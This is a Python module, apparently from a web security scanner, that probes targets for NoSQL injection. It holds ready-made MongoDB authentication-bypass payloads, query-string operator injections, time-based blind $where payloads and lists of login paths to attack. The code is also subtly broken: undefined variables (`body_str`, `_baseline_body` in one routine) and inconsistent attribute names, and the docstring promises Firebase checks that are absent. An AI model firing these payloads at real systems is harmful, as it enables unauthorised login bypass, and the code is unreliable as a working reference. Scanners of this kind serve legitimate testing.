"""
PhantomScan — NoSQL Injection Scanner
Teste les injections NoSQL sur MongoDB, CouchDB, Firebase, DynamoDB.

Techniques couvertes :
  - Opérateurs MongoDB ($ne, $gt, $regex, $where, $elemMatch)
  - Auth bypass via injection dans le body JSON / form / query string
  - Blind NoSQL via timing (sleep / $where + boucle JS)
  - Array pollution (param[] vs param)
  - Firebase / Firestore : règles ouvertes (requêtes non authentifiées)
"""

from __future__ import annotations

import json
import time
from typing import AsyncGenerator
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester, ProbeRequest
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity
from phantomscan.core.scanner_mixin import ScannerMixin

# ------------------------------------------------------------------
# Payloads
# ------------------------------------------------------------------

# Bypass auth via opérateurs de comparaison (body JSON)
AUTH_BYPASS_JSON = [
    ({"username": {"$ne": "x"}, "password": {"$ne": "x"}},         "mongo_ne_bypass"),
    ({"username": {"$gt": ""}, "password": {"$gt": ""}},            "mongo_gt_bypass"),
    ({"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},  "mongo_regex_bypass"),
    ({"username": "admin", "password": {"$gt": ""}},                "mongo_admin_gt"),
    ({"username": "admin", "password": {"$ne": "wrongpassword"}},   "mongo_admin_ne"),
    ({"$where": "this.username == 'admin'"},                         "mongo_where"),
]

# Bypass via query string (param[$ne]=x)
AUTH_BYPASS_QS = [
    ("[$ne]", "invalid_x",   "qs_ne_bypass"),
    ("[$gt]", "",            "qs_gt_bypass"),
    ("[$regex]", ".*",       "qs_regex_bypass"),
    ("[$exists]", "true",    "qs_exists_bypass"),
]

# Payloads time-based blind (MongoDB $where + sleep JS)
TIME_BASED = [
    '{"$where": "sleep(3000) || 1"}',
    '{"$where": "function(){ var d=new Date(); var b=new Date(); while(b-d<3000){b=new Date();} return 1; }"}',
    '{"username": {"$where": "sleep(3000)"}, "password": "x"}',
]

# Endpoints susceptibles de recevoir des creds
AUTH_PATHS = [
    "/login", "/signin", "/auth", "/authenticate",
    "/api/login", "/api/signin", "/api/auth", "/api/authenticate",
    "/api/v1/login", "/api/v1/auth", "/api/v2/login", "/api/v2/auth",
    "/user/login", "/users/login", "/account/login",
    "/admin/login", "/wp-login.php",
]

# Endpoints de recherche / filtrage
SEARCH_PATHS = [
    "/search", "/api/search", "/api/users", "/api/items",
    "/api/products", "/api/v1/search", "/api/v1/users",
]

# Marqueurs de succès d'auth bypass
SUCCESS_INDICATORS = [
    "token", "access_token", "jwt", "session", "dashboard",
    "welcome", "logged in", "authentication successful",
    "\"id\":", "\"user\":", "\"email\":", "\"role\":",
]

# Marqueurs d'erreurs NoSQL qui révèlent le moteur
NOSQL_ERROR_PATTERNS = [
    "MongoError", "mongo", "document", "$where", "$regex",
    "CastError", "ValidatorError", "ObjectId",
    "SyntaxError: invalid", "Unexpected token",
    "CouchDB", "Firebase", "DynamoDB",
    "failed to parse", "operator", "BSON",
]

TIME_THRESHOLD_S = 2.5  # secondes pour considérer un timing attack comme positif


class NoSQLInjectionScanner(ScannerMixin):

    _RPS = 3.0

    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req = req
        self._heuristic = heuristic
        self._cfg = cfg

    # ------------------------------------------------------------------
    # Point d'entrée
    # ------------------------------------------------------------------

    async def run(self, target: str) -> AsyncGenerator[Finding, None]:
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # 1. Auth bypass sur endpoints de login
        async for f in self._scan_auth_endpoints(base):
            yield f

        # 2. Injection dans query string sur endpoints de recherche
        async for f in self._scan_search_endpoints(base, target):
            yield f

        # 3. Blind time-based sur l'URL cible directement
        async for f in self._scan_time_based(target):
            yield f

    # ------------------------------------------------------------------
    # Auth bypass
    # ------------------------------------------------------------------

    async def _scan_auth_endpoints(self, base: str) -> AsyncGenerator[Finding, None]:
        for path in AUTH_PATHS:
            url = f"{base}{path}"

            # Récupérer une baseline propre
            baseline = await self._req.send(ProbeRequest(method="GET", url=url))
            if baseline.error or baseline.status_code == 404:
                continue

            # Tenter le bypass JSON
            async for f in self._try_json_bypass(url):
                yield f

            # Tenter le bypass query string
            async for f in self._try_qs_bypass(url):
                yield f

    async def _try_json_bypass(self, url: str) -> AsyncGenerator[Finding, None]:
        # v5.20 — Baseline : réponse sans injection pour comparer
        try:
            _bl_resp = await self._req.send(ProbeRequest(
                method="POST", url=url,
                headers={"Content-Type": "application/json"},
                body='{"username":"baseline_probe_xyz","password":"baseline_probe_xyz"}',
            ))
            _baseline_body = _bl_resp.body if not _bl_resp.error else ""
        except Exception:
            _baseline_body = ""

        for payload_dict, label in AUTH_BYPASS_JSON:
            body = json.dumps(payload_dict)
            resp = await self._req.send(ProbeRequest(
                method="POST",
                url=url,
                headers={"Content-Type": "application/json"},
                body=body,
            ))
            if resp.error:
                continue

            text = (resp.body or "").lower()
            matched = [ind for ind in SUCCESS_INDICATORS if ind in text]
            error_matched = [p for p in NOSQL_ERROR_PATTERNS if p.lower() in text]

            if resp.status_code in (200, 201, 302) and matched:
                # v5.20 — vérifier que la réponse diffère du baseline (anti-FP)
                if _baseline_body:
                    diff = self.stable_diff(resp.body or "", _baseline_body)
                    if diff < 0.05 and resp.status_code not in (302,):
                        continue  # indiscernable du baseline → FP
                # v5.20 — re-probe pour confirmer la reproductibilité
                resp2 = await self.re_probe(url, method="POST",
                    headers={"Content-Type": "application/json"},
                    body=body_str, delay_s=0.3)
                if resp2 is None or resp2.status not in (200, 201, 302):
                    continue
                yield Finding(
                    title="NoSQL Injection — Auth Bypass",
                    url=url,
                    severity=Severity.CRITICAL,
                    description=(
                        f"Auth bypass via opérateur MongoDB `{label}`.\n"
                        f"Payload: {body}\n"
                        f"Status: {resp.status_code} | Indicateurs: {matched}"
                    ),
                    evidence=body,
                    module="nosql_injection",
                )
                return  # Un seul finding par endpoint suffit

            if error_matched:
                yield Finding(
                    title="NoSQL Error Disclosure",
                    url=url,
                    severity=Severity.MEDIUM,
                    description=(
                        f"Message d'erreur NoSQL dans la réponse — moteur détecté.\n"
                        f"Payload: {body}\n"
                        f"Patterns: {error_matched}"
                    ),
                    evidence=body,
                    module="nosql_injection",
                )

    async def _try_qs_bypass(self, url: str) -> AsyncGenerator[Finding, None]:
        """Teste username[$ne]=x&password[$ne]=x en form-urlencoded."""
        for suffix, value, label in AUTH_BYPASS_QS:
            params = f"username{suffix}=invalid&password{suffix}={value}"
            probe_url = f"{url}?{params}" if "?" not in url else f"{url}&{params}"

            resp = await self._req.send(ProbeRequest(
                method="GET",
                url=probe_url,
            ))
            if resp.error:
                continue

            text = (resp.body or "").lower()
            matched = [ind for ind in SUCCESS_INDICATORS if ind in text]

            if resp.status_code in (200, 201, 302) and matched:
                # v5.20 — vérifier que la réponse diffère du baseline (anti-FP)
                if _baseline_body:
                    diff = self.stable_diff(resp.body or "", _baseline_body)
                    if diff < 0.05 and resp.status_code not in (302,):
                        continue  # indiscernable du baseline → FP
                # v5.20 — re-probe pour confirmer la reproductibilité
                resp2 = await self.re_probe(url, method="POST",
                    headers={"Content-Type": "application/json"},
                    body=body_str, delay_s=0.3)
                if resp2 is None or resp2.status not in (200, 201, 302):
                    continue
                yield Finding(
                    title="NoSQL Injection — Query String Bypass",
                    url=url,
                    severity=Severity.HIGH,
                    description=(
                        f"Injection NoSQL via query string (`{label}`).\n"
                        f"Paramètre testé: username{suffix}=invalid\n"
                        f"Status: {resp.status_code} | Indicateurs: {matched}"
                    ),
                    evidence=params,
                    module="nosql_injection",
                )
                return

    # ------------------------------------------------------------------
    # Search / Filter injection
    # ------------------------------------------------------------------

    async def _scan_search_endpoints(
        self, base: str, target: str
    ) -> AsyncGenerator[Finding, None]:
        # Extraire les params de l'URL cible
        parsed = urlparse(target)
        qs_params = parse_qs(parsed.query)

        # Tester les endpoints de recherche communs
        search_urls = [f"{base}{p}" for p in SEARCH_PATHS]
        if target not in search_urls:
            search_urls.insert(0, target)

        for url in search_urls:
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query) or {"q": ["test"], "search": ["test"]}

            for param_name in list(params.keys())[:3]:  # Limiter à 3 params
                # Tester opérateur $regex pour extraction de données
                for suffix, value, label in AUTH_BYPASS_QS:
                    probe_qs = {k: v for k, v in params.items()}
                    probe_qs[f"{param_name}{suffix}"] = [value]
                    if param_name in probe_qs:
                        del probe_qs[param_name]

                    new_qs = urlencode(probe_qs, doseq=True)
                    probe_url = urlunparse(parsed_url._replace(query=new_qs))

                    resp = await self._req.send(ProbeRequest(method="GET", url=probe_url))
                    if resp.error:
                        continue

                    text = resp.body or ""
                    error_matched = [p for p in NOSQL_ERROR_PATTERNS if p.lower() in text.lower()]

                    if error_matched:
                        yield Finding(
                            title="NoSQL Injection — Operator in Query Parameter",
                            url=url,
                            severity=Severity.HIGH,
                            description=(
                                f"Opérateur NoSQL accepté dans le paramètre `{param_name}`.\n"
                                f"Suffixe testé: {suffix} | Technique: {label}\n"
                                f"Erreurs révélées: {error_matched}"
                            ),
                            evidence=probe_url,
                            module="nosql_injection",
                        )
                        break

    # ------------------------------------------------------------------
    # Time-based blind
    # ------------------------------------------------------------------

    async def _scan_time_based(self, target: str) -> AsyncGenerator[Finding, None]:
        for payload in TIME_BASED:
            t0 = time.monotonic()
            resp = await self._req.send(ProbeRequest(
                method="POST",
                url=target,
                headers={"Content-Type": "application/json"},
                body=payload,
            ))
            elapsed = time.monotonic() - t0

            if resp.error:
                continue

            if elapsed >= TIME_THRESHOLD_S:
                # Double confirmation
                t1 = time.monotonic()
                resp2 = await self._req.send(ProbeRequest(
                    method="POST",
                    url=target,
                    headers={"Content-Type": "application/json"},
                    body=payload,
                ))
                elapsed2 = time.monotonic() - t1

                if elapsed2 >= TIME_THRESHOLD_S:
                    yield Finding(
                        title="NoSQL Injection — Blind Time-Based ($where)",
                        url=target,
                        severity=Severity.HIGH,
                        description=(
                            f"Délai anormal détecté avec payload `$where` MongoDB.\n"
                            f"Délai confirmation 1: {elapsed:.1f}s | Confirmation 2: {elapsed2:.1f}s\n"
                            f"Payload: {payload}"
                        ),
                        evidence=payload,
                        module="nosql_injection",
                    )
                    return
